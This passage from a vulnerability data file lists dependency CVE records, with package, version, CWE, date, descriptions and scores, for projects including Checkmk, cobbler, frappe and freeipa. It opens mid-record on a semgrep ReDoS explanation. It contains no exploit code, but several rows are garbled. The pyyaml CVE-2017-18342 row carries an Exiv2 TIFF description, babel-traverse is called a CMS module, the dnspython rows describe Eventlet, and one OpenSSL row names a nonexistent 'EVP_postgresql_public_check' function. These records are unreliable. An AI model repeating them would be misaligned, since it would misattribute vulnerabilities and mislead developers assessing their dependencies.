Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `semgrep` to version 1.25.0 or higher.
## References
- [GitHub Commit](https://github.com/returntocorp/semgrep/pull/7943/commits/db648a59c6ea2b4c29fa142983b53db90f7fd086)
- [GitHub PR](https://github.com/returntocorp/semgrep/pull/7943)
",3,2
Checkmk_checkmk,protobuf,4.25.6 \,True,CVE-2025-4565,CWE-674,2025-06-16,Protobuf 是一种用于序列化结构化数据的库，广泛应用于数据传输、配置文件保存等领域。该漏洞影响 Protobuf 的纯 Python 实现，当对含有任意数量递归组、递归消息或 SGROUP 标签的未受信任数据进行解析时，可能会超过 Python 的递归限制。攻击者可以利用这些递归结构触发无限递归，导致解析进程崩溃，从而造成拒绝服务。,2,2
Checkmk_checkmk,requests,2.32.3 \,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
Checkmk_checkmk,setuptools,78.1.0 \,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
Checkmk_checkmk,urllib3,2.3.0 \,True,CVE-2025-50182,CWE-601,2025-06-19,<p>urllib3 是一个用于在 Python 中执行 HTTP 请求的流行库，并在 Pyodide 运行时中支持使用 JavaScript Fetch API 或回退使用 XMLHttpRequest。这意味着可以从浏览器或 Node.js 中使用 Python 库进行 HTTP 请求控制。然而，在 Pyodide 中，这些请求的重定向行为因 `retries` 和 `redirect` 参数被忽略而受到影响，由运行时自行决定重定向行为。</p>,3,2
Checkmk_checkmk,urllib3,2.3.0 \,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
Checkmk_checkmk,babel-traverse,6.26.0,False,CVE-2023-45133,CWE-184 CWE-697,2023-10-12,"Babel是一款使用在内容管理系统中的多语言支持模块。
Babel 存在安全漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",1,0
Checkmk_checkmk,openssl-sys,0.9.106,False,CVE-2025-3416,CWE-416,2025-04-06,OpenSSL 是一个广泛使用的开源加密库，提供安全通信和加密功能。该漏洞出现在 OpenSSL 对某些函数中属性参数的处理上，导致可能发生使用后释放 (use-after-free) 的情况。这种漏洞可能导致未定义的行为或属性解析不正确，从而使得 OpenSSL 将输入视为一个空字符串。,2,0
Checkmk_checkmk,rand_core,0.5.1,False,CVE-2021-27378,CWE-131,2021-02-17,"Rust是Mozilla基金会的一款通用、编译型编程语言。
Rust rand_core 中存在安全特征问题漏洞,该漏洞源于read_u32_into和read_u64_into错误处理了缓冲区长度检查，攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。以下产品及型号受到影响：Rust rand_core 0.6.2",1,2
Checkmk_checkmk,ring,0.17.9,False,CVE-2025-4432,CWE-770,2025-05-09,Rust的Ring包是一个用于加密操作的库，提供安全、快速的加密功能。该漏洞因溢出检测机制触发恐慌导致，攻击者可通过发送特制的QUIC协议数据包诱发该恐慌。,3,2
Checkmk_checkmk,tracing-subscriber,0.3.19,False,CVE-2025-58160,CWE-150,2025-08-29,"tracing是Tokio开源的一个应用软件。
tracing 0.3.20之前版本存在安全漏洞，该漏洞源于ANSI转义序列注入，可能导致终端操纵。",4,0
Checkmk_checkmk,openssl-sys,0.9.105,False,CVE-2025-3416,CWE-416,2025-04-06,OpenSSL 是一个广泛使用的开源加密库，提供安全通信和加密功能。该漏洞出现在 OpenSSL 对某些函数中属性参数的处理上，导致可能发生使用后释放 (use-after-free) 的情况。这种漏洞可能导致未定义的行为或属性解析不正确，从而使得 OpenSSL 将输入视为一个空字符串。,2,0
cobbler_cobbler,dnspython,,True,CVE-2023-29483,CWE-292,2024-02-11,"Eventlet是Python的一个并发网络库。
Eventlet 0.35.2之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过从预期的IP地址和源端口快速发送无效数据包来干扰DNS名称解析。",2,0
cobbler_cobbler,pyyaml,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
cobbler_cobbler,pyyaml,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
cobbler_cobbler,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
cobbler_cobbler,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
cobbler_cobbler,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
cobbler_cobbler,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
cobbler_cobbler,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
cobbler_cobbler,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
cobbler_cobbler,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
cobbler_cobbler,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
cobbler_cobbler,pyyaml,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
cobbler_cobbler,pyyaml,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
cobbler_cobbler,python-ldap,,True,,CWE-1333,2021-11-30,"https://github.com/python-ldap/python-ldap/issues/424

### Impact
The LDAP schema parser of python-ldap 3.3.1 and earlier are vulnerable to a regular expression denial-of-service attack. The issue affects clients that use ``ldap.schema`` package to parse LDAP schema definitions from an untrusted source.

### Patches
The upcoming release of python-ldap 3.4.0 will contain a workaround to prevent ReDoS attacks. The schema parser refuses schema definitions with an excessive amount of backslashes.

### Workarounds
As a workaround, users can check input for excessive amount of backslashes in schemas. More than a dozen backslashes per line are atypical.

### References
[CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [python-ldap](https://github.com/python-ldap/python-ldap) tracker
",3,0
cobbler_cobbler,python-ldap,,True,CVE-2021-46823,CWE-1333,2021-11-30,"python-ldap是python-ldap开源的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.0之前版本存在安全漏洞，该漏洞源于 LDAP 模式解析器中存在正则表达式拒绝服务 (ReDoS) 缺陷。攻击者利用该漏洞通过发送特制的正则表达式输入导致拒绝服务。",3,0
cobbler_cobbler,python-ldap,,True,CVE-2025-61912,CWE-116 CWE-170,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.dn.escape_dn_chars函数对x00转义不正确，可能导致客户端拒绝服务。",3,2
cobbler_cobbler,python-ldap,,True,CVE-2025-61911,CWE-75 CWE-843,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.filter.escape_filter_chars方法在escape_mode=1模式下未正确处理list或dict类型的assertion_value参数，可能导致LDAP注入攻击。",3,2
cobbler_cobbler,dnspython,,True,CVE-2023-29483,CWE-292,2024-02-11,"Eventlet是Python的一个并发网络库。
Eventlet 0.35.2之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过从预期的IP地址和源端口快速发送无效数据包来干扰DNS名称解析。",2,0
cobbler_cobbler,gunicorn,,True,,CWE-20,2021-04-02,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to Improper Input Validation. Gunicorn fails with a 500, instead of a 400, when a request path is a malformed IPv6 address. This is due to no raise 'InvalidRequestLine' exception when the line contains malicious data.
## Remediation
Upgrade `gunicorn` to version 19.4.0 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/b951175c66c353d10127a20a62f61e834829856c)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/1023)
",4,0
cobbler_cobbler,gunicorn,,True,,CWE-444,2020-01-09,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to HTTP Request Smuggling. It fails to properly process the `Transfer-Encoding` and `Content-Length` headers when both are present in a package request. This allows for conflicting information to be sent regarding the length of the package, which when processed by back-end servers under certain configurations would allow for malicious users to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
## Remediation
Upgrade `gunicorn` to version 19.10.0, 20.0.1 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/c5be1bae5c42b1e600be22d0655fc3ec4e4711cb)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/2176)
- [GitHub PR](https://github.com/benoitc/gunicorn/pull/2181)
- [Gunicorn ChangeLog](https://docs.gunicorn.org/en/stable/news.html#id1)
- [HTTP Request Smuggling Security Blog](https://portswigger.net/web-security/request-smuggling)
",3,0
cobbler_cobbler,gunicorn,,True,CVE-2018-1000164,CWE-93,2018-04-18,"gunicorn是一款基于UNIX平台的Python WSGI HTTP服务器软件。

gunicorn 19.4.5版本中的nicorn/http/wsgi.py文件的‘process_headers’函数存在安全漏洞。攻击者可利用该漏洞造成服务器返回任意的HTTP包头。",2,2
cobbler_cobbler,gunicorn,,True,CVE-2024-1135,CWE-444,,Gunicorn是一个开源的Python WSGI HTTP服务器，旨在处理网络请求并提供高性能的Web服务。该组件存在HTTP请求走私漏洞，原因在于对`Transfer-Encoding`标头的验证不当，攻击者可以通过构造包含相互冲突的`Transfer-Encoding`标头的请求，从而绕过安全限制，访问受限的端点。此漏洞的触发条件是用户的网络路径未能过滤无效请求。,2,1
cobbler_cobbler,gunicorn,,True,CVE-2024-6827,CWE-444,,Gunicorn是一个开源的Python Web服务器网关接口（WSGI）HTTP服务器。Gunicorn版本21.2.0未能正确验证'Transfer-Encoding'头的值，导致在RFC标准中规定的默认回退方法为'Content-Length'，使其易受TE.CL请求夹带攻击。攻击者可以通过构造特定的HTTP请求来利用此漏洞，造成缓存中毒、数据泄露、会话操纵、SSRF、XSS、DoS、数据完整性损害、安全绕过、信息泄漏和业务逻辑滥用等问题。,2,1
frappe_frappe,ws,8.11.0,False,CVE-2024-37890,CWE-476,2024-06-16,Node.js的ws模块是一个开源的WebSocket客户端和服务器实现。在存在漏洞的版本中，攻击者可以发送包含超过server.maxHeadersCount阈值数量的头的请求，从而使得ws服务器崩溃。,2,2
frappe_frappe,cookie,0.4.2,False,CVE-2024-47764,CWE-74,2024-10-04,"cookie是jshttp开源的一个 HTTP 服务器 cookie 解析和序列化库。
cookie 0.7.0之前版本存在安全漏洞，该漏洞源于允许攻击者通过操纵cookie名称来设置cookie的其他字段，导致意外的cookie值。",3,2
frappe_frappe,loader-utils,0.2.17,False,CVE-2022-37601,CWE-1321,2022-10-12,"loader-utils是webpack开源的一个用于 webpack 加载器的实用程序。
webpack loader-utils 2.0.0版本存在安全漏洞，该漏洞源于parseQuery.js的parseQuerys函数中发现包含原型污染漏洞。",1,2
frappe_frappe,quill,1.3.7,False,CVE-2021-3163,CWE-79,2021-04-12,"Quill是Quill开源的一个应用软件。提供应用编辑器功能。
Quill 4.8.0版本存在跨站脚本漏洞，该漏洞允许攻击者通过在文本字段中存储XSS有效载荷来执行任意JavaScript。",3,0
freeipa_freeipa,wheel,,True,CVE-2022-40898,CWE-20,2022-12-22,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python Packaging Authority (PyPA) Wheel 0.37.1版本及之前版本存在安全漏洞。攻击者利用该漏洞通过控制Wheel cli输入导致拒绝服务。",2,2
freeipa_freeipa,dnspython,,True,CVE-2023-29483,CWE-292,2024-02-11,"Eventlet是Python的一个并发网络库。
Eventlet 0.35.2之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过从预期的IP地址和源端口快速发送无效数据包来干扰DNS名称解析。",2,0
freeipa_freeipa,jwcrypto,,True,CVE-2022-3102,CWE-287,2022-09-22,jwcrypto 是一个支持 JSON Web Token (JWT) 的加密库，专门用于处理和操作 JWT 令牌中的加密和签名功能。该漏洞的根本原因在于 JWT 自动检测令牌类型的特性。在处理 JSON Web Encryption (JWE) 令牌时，攻击者可以将使用公钥加密的 JWE 令牌替换为已签名的 JSON Web Signature (JWS) 令牌，从而绕过系统的授权机制，导致不当的访问权限被授予。,3,0
freeipa_freeipa,jwcrypto,,True,CVE-2023-6681,CWE-400,2023-12-29,"JWCrypto是JWCrypto开源的一个 Javascript 对象签名和加密 (JOSE) Web 标准的实现。
JWCrypto存在安全漏洞，该漏洞源于允许攻击者发起拒绝服务(DoS)攻击以及可能的密码暴力破解和字典攻击。",3,2
freeipa_freeipa,jwcrypto,,True,CVE-2024-28102,CWE-770,2024-03-06,"JWCrypto是JWCrypto开源的一个 Javascript 对象签名和加密 (JOSE) Web 标准的实现。
JWCrypto 1.5.5及之前版本存在安全漏洞，该漏洞源于允许攻击者通过传入高压缩比的恶意 JWE Token 来引发 DoS 攻击。",3,0
freeipa_freeipa,jwcrypto,,True,CVE-2016-6298,CWE-200,2016-08-31,"jwcrypto是一套使用Python开发并实现JavaScript对象签名和加密的标准。
jwcrypto 0.3.2之前的版本中的jwa.py中的RSA 1.5版本的算法实现过程中的_Rsa15类存在安全漏洞，该漏洞源于程序缺少Random Filling保护机制。远程攻击者可借助Million Message Attack利用该漏洞获取明文数据。",3,0
freeipa_freeipa,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
freeipa_freeipa,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
freeipa_freeipa,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
freeipa_freeipa,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
freeipa_freeipa,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
freeipa_freeipa,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
freeipa_freeipa,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
freeipa_freeipa,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
freeipa_freeipa,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
freeipa_freeipa,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
freeipa_freeipa,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
freeipa_freeipa,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
freeipa_freeipa,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
freeipa_freeipa,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
freeipa_freeipa,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
